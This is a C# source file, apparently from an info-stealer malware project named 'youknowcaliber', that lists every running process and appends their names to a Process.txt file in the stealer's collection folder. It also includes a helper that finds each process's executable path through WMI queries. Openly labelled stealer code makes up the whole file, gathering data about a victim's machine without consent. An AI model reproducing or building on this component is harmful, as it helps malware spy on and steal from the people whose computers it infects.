using System.Diagnostics;
using System.IO;
using System.Management;

namespace youknowcaliber
{
    class ProcessList
    {
        public static void WriteProcesses()
        {
            string Stealer_Dir = Help.ExploitDir;
            foreach (Process process in Process.GetProcesses())
            {
                File.AppendAllText(
                    Stealer_Dir + "\\Process.txt", "NAME: " + process.ProcessName + "\n\n");
            }
        }
        public static string ProcessExecutablePath(Process process)
        {
            try
            {
                return process.MainModule.FileName;
            }
            catch
            {
                string query = "SELECT ExecutablePath, ProcessID FROM Win32_Process";
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);

                foreach (ManagementObject item in searcher.Get())
                {
                    object id = item["ProcessID"];
                    object path = item["ExecutablePath"];

                    if (path != null && id.ToString() == process.Id.ToString())
                    {
                        return path.ToString();
                    }
                }
            }

            return "";
        }
    }
}
